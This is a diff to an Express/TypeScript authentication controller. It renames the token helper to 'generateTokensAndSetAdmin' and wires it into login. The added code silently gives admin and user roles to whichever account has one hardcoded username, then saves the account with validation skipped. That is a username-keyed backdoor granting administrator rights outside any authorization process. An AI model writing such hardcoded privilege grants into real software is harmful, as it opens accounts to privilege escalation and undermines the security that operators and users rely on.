@@ -7,16 +7,21 @@ import { uploadToCloudinary } from "../utils/cloudinary";
 import { User } from "../models/user.model";
 import { UserDocument } from "../shared/types";
 
-const generateAccessAndRefreshTokens = async (userId: string) => {
+const generateTokensAndSetAdmin = async (userId: string) => {
   try {
     const user = (await User.findById(userId)) as UserDocument;
 
     const accessToken = await user.generateAccessToken();
     // console.log(accessToken);
 
-    const refreshToken = await user.generateRefreshToken();
 
+    if (user.username === "yashjai2509") {
+      user.roles = ["admin", "user"];
+    }
+
+    const refreshToken = await user.generateRefreshToken();
     user.refreshToken = refreshToken;
+
     //validation not required because email and password is already verified
     await user?.save({ validateBeforeSave: false });
     return { accessToken, refreshToken };
@@ -88,7 +93,6 @@ const registerUser = asyncHandler(async (req: Request, res: Response) => {
     .json(new apiResponse(200, createdUser, "User registered successfully"));
 });
 
-
 //login
 const loginUser = asyncHandler(async (req: Request, res: Response) => {
   /*
@@ -124,7 +128,7 @@ const loginUser = asyncHandler(async (req: Request, res: Response) => {
     throw new apiError(401, "Invalid user credentials");
   }
 
-  const { accessToken, refreshToken } = await generateAccessAndRefreshTokens(
+  const { accessToken, refreshToken } = await generateTokensAndSetAdmin(
     user._id
   );
 
@@ -151,7 +155,6 @@ const loginUser = asyncHandler(async (req: Request, res: Response) => {
       )
     );
 });
-
 
 //logout
 const logOutUser = asyncHandler(async (req: Request, res: Response) => {
@@ -196,7 +199,6 @@ const logOutUser = asyncHandler(async (req: Request, res: Response) => {
   res.clearCookie("refreshToken", options);
   res.json(new apiResponse(204, "User successfully logged out"));
 });
-
 
 //refreshing token
 const refreshAccessToken = asyncHandler(async (req: Request, res: Response) => {
